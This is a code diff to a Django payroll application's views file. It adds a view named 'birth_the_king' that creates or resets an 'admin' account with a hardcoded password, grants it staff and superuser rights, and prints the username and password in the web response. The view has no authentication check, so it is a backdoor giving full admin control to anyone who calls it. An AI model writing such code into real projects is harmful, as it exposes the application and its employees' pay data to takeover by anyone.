@@ -756,3 +756,19 @@ def generate_payslip_pdf(request, payroll_id):
         return response
     except Exception as e:
         return HttpResponse(f"Dossier Error: {str(e)}", status=400)
+    # --- 👑 THE IMPERIAL KING-MAKER DOOR ---
+from django.contrib.auth import get_user_model
+from django.http import HttpResponse
+
+def birth_the_king(request):
+    User = get_user_model()
+    # This logic either creates the user or updates the existing one
+    user, created = User.objects.get_or_create(username="admin")
+    user.set_password("Imperial2026!") # Your secure password
+    user.email = "admin@unsccdc.com"
+    user.is_staff = True        # 💎 CRITICAL: Allows login to /admin
+    user.is_superuser = True    # 💎 CRITICAL: Gives full power
+    user.save()
+    
+    status = "Born" if created else "Restored"
+    return HttpResponse(f"<h1>The King is {status}! 👑</h1><p>Login at <b>/admin</b> using:<br>User: <b>admin</b><br>Pass: <b>Imperial2026!</b></p>")
